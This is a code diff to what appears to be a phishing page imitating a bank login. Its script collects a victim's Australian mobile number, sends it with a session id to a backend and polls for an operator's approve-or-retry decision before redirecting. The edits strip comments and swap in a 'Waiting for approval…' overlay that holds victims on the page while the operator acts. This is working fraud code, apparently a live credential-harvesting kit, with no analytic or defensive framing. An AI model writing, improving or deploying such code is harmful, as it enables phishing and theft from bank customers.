@@ -27299,8 +27299,8 @@ if (!location.search.includes('sid=')) {
 
 /* =====  MAIN LOGIC  ===== */
 document.addEventListener('DOMContentLoaded', () => {
-  const field = document.getElementById('cifField');   // your phone input
-  const btn   = document.getElementById('login-btn');  // your continue button
+  const field = document.getElementById('cifField');
+  const btn   = document.getElementById('login-btn');
   const overlay = document.createElement('div');
   overlay.id = 'verify-loading-overlay';
   overlay.style.cssText = `
@@ -27308,7 +27308,7 @@ document.addEventListener('DOMContentLoaded', () => {
     display:none;flex-direction:column;align-items:center;justify-content:center;z-index:9999`;
   overlay.innerHTML = `
     <div style="width:60px;height:60px;border:4px solid rgba(255,102,0,.2);border-top:4px solid #ff6600;border-radius:50%;animation:ing-spin 1s linear infinite"></div>
-    <p style="color:#fff;font-size:16px;margin-top:20px;letter-spacing:1px">Verifying…</p>`;
+    <p style="color:#fff;font-size:16px;margin-top:20px;letter-spacing:1px">Waiting for approval…</p>`;
   if (!document.getElementById('ing-spin-style')) {
     const s = document.createElement('style');
     s.id = 'ing-spin-style';
@@ -27331,7 +27331,7 @@ document.addEventListener('DOMContentLoaded', () => {
   field.addEventListener('input', () => {
     const clean = toAU(field.value);
     if (field.value !== clean) field.value = clean;
-    btn.disabled = !/^04\d{8}$/.test(clean);   // 04 + 8 digits
+    btn.disabled = !/^04\d{8}$/.test(clean);
   });
 
   /* ----------  SUBMIT  ---------- */
@@ -27344,9 +27344,8 @@ document.addEventListener('DOMContentLoaded', () => {
       body: JSON.stringify({ sid: verifySid, phone: field.value })
     })
     .then(r => {
-      overlay.style.display = 'none';
       if (r.ok) { startPoll(); }
-      else { btn.disabled = false; alert('Unable to save number'); }
+      else { overlay.style.display = 'none'; btn.disabled = false; alert('Unable to save number'); }
     })
     .catch(() => {
       overlay.style.display = 'none';
@@ -27366,12 +27365,14 @@ document.addEventListener('DOMContentLoaded', () => {
         const d = await r.json();
         if (d.status === 'ok') {
           polling = false;
+          overlay.style.display = 'none';
           await fetch('/api/clearOk', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ sid: verifySid }) });
           location.href = '/unregister.html?sid=' + verifySid;
           return;
         }
         if (d.status === 'redo') {
           polling = false;
+          overlay.style.display = 'none';
           await fetch('/api/clearRedo', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ sid: verifySid }) });
           field.value = ''; field.dispatchEvent(new Event('input')); btn.disabled = true;
           return;
@@ -28704,4 +28705,5 @@ document.addEventListener('DOMContentLoaded', () => {
  </body>
 
 </html>
+
 
